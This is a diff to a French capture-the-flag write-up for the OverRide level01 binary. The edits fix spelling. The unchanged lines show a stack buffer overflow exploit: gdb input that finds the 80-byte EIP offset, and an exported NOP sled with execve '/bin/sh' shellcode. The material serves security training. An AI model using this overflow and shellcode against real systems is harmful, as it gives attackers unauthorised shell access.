@@ -1,10 +1,10 @@
 # Level 01
 
-Dans ce programme, on a deux variable, une pour le mot de passe et une pour le username.</br>
-En premier lieu il va lire de 256 caracteres dans la variable username et verifier que le username est egal a dat_wil.</br>
-Si c'est le cas alors il va lire 100 caracteres dans la variable pass, mais cette variable ne peut seulement contenir 16 caracteres.
+Dans ce programme, on a deux variables, une pour le mot de passe et une pour le username.</br>
+En premier lieu il va lire 256 caractères dans la variable username et vérifier que le username est égale à dat_wil.</br>
+Si c'est le cas alors il va lire 100 caractères dans la variable pass, mais cette variable ne peut seulement contenir 16 caractères.
 
-On va essayer d'overflow fgets pour récuperer l'offset jusqu'a EIP.
+On va essayer d'overflow fgets pour récuperer l'offset jusqu'à EIP.
 ```
 (gdb) r < <(echo "dat_wil";for x in {A..z}; do echo -n "$x$x$x$x"; done)
 Starting program: /home/users/level01/level01 < <(echo "dat_wil"; for x in {A..z}; do echo -n "$x$x$x$x"; done)
@@ -25,7 +25,7 @@ $ python
 >>> (ord('U') - ord('A')) * 4
 80
 ```
-Maintenant qu'on a notre offset, on va pouvoir faire un NOP sled avec un shellcode, en mettant l'adresse de notre NOP sled dans EIP.
+Maintenant qu'on a notre offset, on va pouvoir faire un NOP sled avec un shellcode, en mettant l'adresse de notre NOP sled dans saved EIP.
 ```
 level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 level01@OverRide:~$ gdb ./level01
